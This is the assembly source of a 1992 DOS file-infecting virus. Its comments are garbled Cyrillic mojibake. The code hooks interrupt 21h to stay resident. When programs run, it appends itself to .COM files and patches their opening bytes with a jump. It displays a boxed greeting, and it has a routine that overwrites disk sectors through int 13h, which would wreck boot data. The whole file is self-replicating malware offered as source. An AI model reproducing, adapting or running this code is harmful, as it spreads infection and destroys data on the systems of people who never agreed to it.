;
;       ������������ �⪮�����஢���, �������� � ⮫쪮 ��⮬ ��ᬠ�ਢ���
;       source code. (�� ࠢ�� ��� � ��� ࠧ������� �ਤ���� :-)).
;
;       �����쪠� (�����쪠�) �������, ��৮���, ����, ᪮⨭�...
;
;       � ��饬, �����, ����� ��ࠦ��� ��直� ⠬ 䠩�� �� ����⪥ ��
;       �������� - ���� � 䠬����� .COM, ����� ���-� �� �ठ�� ��� ����஬
;       21-�� ����࠯�, �� ��뢠�� ᢮� ⥫� ��୮� � ����, ��ࠦ����
;       䠩�� �������� �� ��ਪ��� (⠪�� ⨯� ������窨, �ᯮ������ �
;       ������� ��த�� ��� ��ᥪ���� ������ � �� ���-祣� � ��������
;       ᢮���), �ᯮ��������� � 4-�� ���� �� ��砫�, � ᢮� ����稥 �
;       ����� �஢���� ⠪: ������ � AX ᫮�� BABA (� ��᫥, �� ⠪��
;       ᫮��, � word 0BABAh), �믮���� 21-� ����࠯⮢���� � ᬮ���,
;       ������ �� ��� ���� 0FACCh. �᫨ ������, � � �窮� �� ����⭮.
;
;       Copyright (c) 1992, Gogi&Givi International
;

jumps
.model  tiny
.code
        org     0100h
VirPar  equ     (endvir-StartVirus)/16+2        ; ����� � ����� ��ࠣ�䮢
VirLen  equ     (endvir-StartVirus)             ; ������� ���� ����� �
                                                ;   ��㣮���� ���������
gadost:
        db      '�'                             ; �� ��� CALL
        dw      StartVirus-$-2                  ; � �� ᬥ饭�� �� StartVirus
        db      15,09h                          ; ��ਪ�� � ���⮪ �� mov ah,
        int     21h                             ; � �� �� ��ଠ���
        ret                                     ;   ��� �����
GoodMessage     db      '������ �����᪨�! ��� �!',13,10,'$'
                                                ; ������� ���ᠤ� ��� �廊
                                                ;   �����᪮��
StartVirus:
        pop     si                              ; �� �⮡� 㧭���, �㤠 ���
        call    EntryPoint                      ;   ����᫮
EntryPoint:
        pop     si                              ; �믨孥� ���� ��砫� ��ࠧ�
        push    ds                              ; ���࠭�� ����-�ன�� ॣ���஢...
        push    es
        push    si
        mov     ax,cs                           ; ����⠭���� ᯥ��� �����
        mov     es,ax                           ;   �� ������� 䠩��
        mov     ds,ax
        mov     di,0100h
        add     si,RobbedBytes-EntryPoint
        mov     cx,4
        cld                                     ; �� ����⠭�������
        rep     movsb
        pop     si
        mov     ax,0ABABh                       ; �஢�ਬ, ���� �� ���� -
        int     21h                             ;   � ��᫥, ���� �� ��
        cmp     ax,0FAAFh                       ;   � �����
        jne     NeedsBaba                       ; ������, ���� ��, த����!
        jmp     FucksNow                        ; �� 㦥 ��ࠡ��뢠��
NeedsBaba:
        pop     es
        push    es
        mov     ax,es                           ; ���뢠�� ᥡ� ���� PSP
        dec     ax
        mov     es,ax                           ; �⮫쪮 � ��襩 ������
        mov     ax,es:[3]                       ;   ��ࠣ�䮢
        sub     ax,virpar
        mov     es:[3],ax
        mov     bx,es:[1]                       ; ���� ���� PSP
        add     bx,ax                           ; �� ᢠ������ � ����
        mov     es,bx
        push    ds                              ; ��, �� ����⭮
        xor     ax,ax
        mov     ds,ax
        mov     ax,ds:[21h*4]                   ; ��墠�뢠�� ����
        mov     cs:[si+Off21-EntryPoint],ax     ;   ����� int 21h
        mov     ax,ds:[21h*4+2]                 ; � ��᫥, �� �� ����,
        mov     cs:[si+Seg21-EntryPoint],ax     ;   �� ���� ���� ������
        pop     ds
        xor     di,di                           ; ��ᮢ뢠�� � ��砫�
        push    si                              ;   ��祩���� ᥣ����
        sub     si,EntryPoint-StartVirus        ;   ���-� �� �����ઠ�
        mov     cx,VirLen                       ;   ����� ��� ���᭮�
        rep     movsb                           ;   ⥫�
        pop     si
        push    ds                              ; � �⠢�� �� 㪠������
        xor     ax,ax                           ;   ���᭮� ⥫� �����
        mov     ds,ax                           ;   ���뢠��� 21h
        mov     word ptr ds:[21h*4],Int21Server-StartVirus
        mov     ds:[21h*4+2],es
        pop     ds

FucksNow:
        pop     es                              ; �� � ��砥, �᫨
        pop     ds                              ;   �।�������� ���騭��
        mov     si,0100h                        ;   (����ᮬ) 㦥 ��������
        push    si
        xor     ax,ax                           ; �� ����⠭�������� �
        xor     bx,bx                           ;   �७� ���� - � �����,
        xor     di,di                           ;   � ����
        ret

Int21Server:
        pushf                                   ; �� ���� ��ࠡ��稪
        push    ax                              ;   21-�� ���
        push    bx
        push    ds
        cmp     ax,0ABABh                       ; ��� �� ��⠭���� ॠ���
        jne     NotTest                         ;   �� �।������� ���騭�
        pop     ds                              ;   (��� �४��)
        pop     bx
        pop     ax
        popf
        mov     ax,0FAAFh                       ; �� ��ଠ�쭠� �४��
        iret                                    ; (� ���� ॠ���)

NotTest:
        push    cx                              ; ��� �� ����᭮ ����⨬��,
        mov     cx,ax                           ;   �⮡� ᤥ���� ���, ��
        xchg    cl,ch                           ;   ��� ᮢᥬ �� �㦭�
        xor     cl,4Bh                          ;   ��ࠡ��뢠�� �㭪�� EXEC
        pop     cx                              ; (�⮡ �����᪨� ������ �����
        jz      Exec                            ;   � �⮡ � ���� �窨 ����⥫�)
        jmp     NotExec

Exec:
        mov     bx,dx                           ; �������� ᬥ饭�� �����
                                                ;   ����᪠����� 䠩�� � BX
SearchZero:
        cmp     byte ptr ds:[bx],0              ; �஢�ਬ �� ����
        je      ZeroFound                       ; ��, ����� �����!
        inc     bx
        jmp     SearchZero

ZeroFound:
        sub     bx,11                           ; �㤥᭮!
        push    es                              ; �஢�ਬ, ���� �����-
        mov     ax,cs                           ;   ����� ��� ������
        mov     es,ax                           ;   ��ࠧ��� COMMAND.COM
        mov     cx,11
        mov     di,offset CommandName-StartVirus

Compare:
        mov     al,ds:[bx]                      ; �� �� ᫮���� � �㤭��
        cmp     al,es:[di]                      ;   ��楤�� �஢�ન...
        jne     NotCommand
        inc     bx
        inc     di
        dec     cx                              ; �� �஢��塞, �஢��塞...
        cmp     cx,0
        jne     Compare
        pop     es
        jmp     Quit21Server                    ; �� � � - ����� COMMAND.COM
                                                ;   ��ࠦ���?!
NotCommand:
        pop     es                              ; ��� �� ��࠭﫨 祣��-�
        push    ax
        push    bx                              ; ���࠭�� ��, �� ����
        push    cx                              ;   �����, �⮡� �� �ய���
        push    dx
        mov     ax,3D02h                        ; ��㯮ਢ��� ������ (䠩�)
        int     21h
        jc      EndExec1                        ; �뢠�� � ����� �஡��
        mov     bx,ax                           ; �������� �஡�� �� 䠩�� � BX
        mov     cx,4                            ; ��⥫��� �� ����� 4 ����
        mov     ax,cs
        mov     ds,ax
        mov     ah,3Fh                          ; � ����, ��� ������
        mov     dx,offset RobbedBytes-StartVirus
        int     21h                             ;   ᯥ��� �����
        jc      EndExec1
        cmp     word ptr cs:[RobbedBytes-StartVirus],'ZM'
        je      CloseFile                       ; �� 䨣� EXE ��ࠦ���???
        xor     cx,cx
        xor     dx,dx
        mov     ax,4202h
        int     21h                             ; ����� � ������� 䠩��
        cmp     ax,1000                         ; �� 䨣� ��� 䠩�� �����
        jl      CloseFile                       ;    1 ����?
        cmp     ax,64000                        ; � ⥬ ����� ����� 64
        ja      CloseFile
        sub     ax,3
        mov     cs:[FileSize-StartVirus],ax     ; ��ਪ��� ?
        cmp     byte ptr cs:[RobbedBytes-StartVirus+3],15
        je      CloseFile                       ; �������!
        mov     ax,cs
        mov     ds,ax
        mov     ah,40h                          ; ���� ����� ஡�� �����
        xor     dx,dx                           ;   ⥫� ��୮� � ������ 䠩��
        mov     cx,VirLen
        int     21h
        xor     cx,cx                           ; � � ��砫� 㡥����, �⮡�
        xor     dx,dx                           ;   JUMP �㤠 ���⠢���
        mov     ax,4200h
        int     21h
        mov     ah,40h
        mov     dx,offset SuperByte-StartVirus  ; ���� �� � � 䠩�, �⮡�
        mov     cx,4                            ;   ��뢠�� ����������
        int     21h                             ;   ᧠�� �����
        jmp     CloseFile

EndExec1: jmp EndExec

mess1:  db      'Hi! hello from MSS!',0dh,0ah,'$'
str1	db	' HELLO FROM OVER1 ','$'

game:   mov     al,0                            ; ����ᨬ � ���稪 0
        mov     [count-0124h],al
        mov     ax,0308h                        ; � AL - 8 ᥪ�஢
        mov     bx,offset endvir                ; � BX - ���� ���� �� 墮�⮬
        mov     dx,0000h
        mov     cx,0001h
        int     13h                             ; ��襬 �� ��� � 8 ᥪ�஢
        jmp     eee                             ; ���� � ���塞.
CloseFile:
        mov     ah,3Eh                          ; ��� �����⨥ 䠩�� - ���
        int     21h                             ;   �� ����� ���� �� �㦥�

        push    ds                              ; �����-������� �����
        push    cs
        pop     ds
;        mov     al,[count-0124h]                ; � 砢� � ��� � ���稪�?
;        inc     al                              ; � ��� ���� +1 ?
;        mov     [count-0124h],al                ; � ��������...
;        cmp     al,02h                          ; ��, 㦥 14 ��㯮�?
;       jl      eee                             ; ���? ����� �������...
        mov     ah,09                           ; Fuck'������...
        mov     dx,offset mess1-0124h
        int     21h

        mov     ah,0 ;
        mov     al,0 ; ��⠭��������  0 �����०��
        int     10h  ;

        mov     ah,2
        mov     bh,0
        mov     dh,0
        mov     dl,10
        int     10h  ; ����樮���㥬 ����� �� 0,10

        mov     ah,9
        mov     al,201
        mov     bl,01000010b
        mov     bh,0
        mov     cx,1
        int     10h  ; �뢮��� ����� �� ��᭮� '�' � ����樨 �����

        mov     ah,2
        mov     bh,0
        mov     dh,0
        mov     dl,11
        int     10h  ; ����樮���㥬 �� 0,11

        mov     ah,9
        mov     al,205
        mov     bl,01000010b
        mov     bh,0
        mov     cx,20
        int     10h  ; �뢮��� 20 ������ �� ��᭮� '�'

        mov     ah,2
        mov     bh,0
        mov     dh,0
        mov     dl,31
        int     10h  ; ����樮���㥬 �� 0,31

        mov     ah,9
        mov     al,187
        mov     bl,01000010b
        mov     bh,0
        mov     cx,1
        int     10h  ; �뢮��� '�'

        mov     ah,2
        mov     bh,0
        mov     dh,1
        mov     dl,10
        int     10h  ; ����樮���㥬 �� 1,10

        mov     ah,9
        mov     bl,01000010b
        mov     al,186
        mov     bh,0
        mov     cx,1
        int     10h  ; �뢮��� '�'

        mov     ah,2
        mov     dx,010bh
        int     10h

        mov     ah,9
        mov     dx,offset str1
        int     21h  ; �뢮��� �ਢ���⢨� 'str1'

        mov     ah,2
        mov     bh,0
        mov     dh,1
        mov     dl,31
        int     10h  ; ����樮���㥬 �� 1,31

        mov     ah,9
        mov     al,186
        mov     bl,01000010b
        mov     bh,0
        mov     cx,1
        int     10h  ; �뢮��� '�'

        mov     ah,2
        mov     dh,2
        mov     dl,31
        int     10h  ; ����樮���㥬 �� 2,31

        mov     ah,9
        mov     al,188
        mov     bl,01000010b
        mov     bh,0
        mov     cx,1
        int     10h  ; �뢮��� '�'

        mov     ah,2
        mov     dh,2
        mov     dl,10
        int     10h  ; ����樮���㥬 �� 3,10

        mov     ah,9
        mov     al,200
        mov     bl,01000010b
        mov     bh,0
        mov     cx,1
        int     10h  ; �뢮��� '�'

        mov     ah,2
        mov     dh,2
        mov     dl,11
        int     10h  ; ����樮���㥬 �� 2,11

        mov     ah,9
        mov     al,205
        mov     bl,01000010b
        mov     bh,0
        mov     cx,20
        int     10h  ; �뢮��� '�' ( 20 ��.)

        mov     ah,2
        mov     dh,25
        mov     dl,0
        int     10h  ; �室�� �� ��࠭���

        mov     ah,2
        mov     bh,0
        mov     dh,24
        mov     dl,0
        int     10h  ; ����樮���㥬 �� 24,0

	MOV	AL,2
        mov     ah,0
        int     10h  ; �����頥� ���� �����०��

	mov	al,[count-0124h]
	cmp	al,3
        jz      game                            ; ��!!! �������� ����������!

eee:    pop     ds                              ; ��� �� 㦥 ������,�९��!

EndExec:
        pop     dx                              ; �� ⠬, ������, ��࠭﫨
        pop     cx                              ;   ����� 祣��-�?
        pop     bx
        pop     ax
        jmp     Quit21Server                    ; � �� �����!

NotExec:
        ; �� ��砩 ᫥����� 堬᪨� ࠧࠡ�⮪

Quit21Server:
        pop     ds                              ; ��� �� �� ⮫쪮
        pop     bx                              ;   STACK'�� �� ������﫨?!
        pop     ax
        popf                                    ; �� � 䫠����?!!!
        db      0EAh
Off21   dw      0000h                           ; ��� �㤥� � �����, ��...
Seg21   dw      0000h

RobbedBytes:
        mov     dx,offset GoodMessage           ; �� �த� ��� ᯥ��� �����
        db      0B4h
SuperByte       db      '�'                     ; � �� �� ᯥ���, ��
FileSize        dw      0000h                   ;   ⮦� ��訥
                db      15                      ; ��ਪ���
                db      '=>'                    ; �� ��� �����
CommandName     db      'COMMAND.COM<='         ; � �� �� COMMAND.COM
count           db      1 dup (0)               ; �� ���� ���稪
REG		DB	1 DUP (0)
endvir:
end     gadost                                  ; � ��!
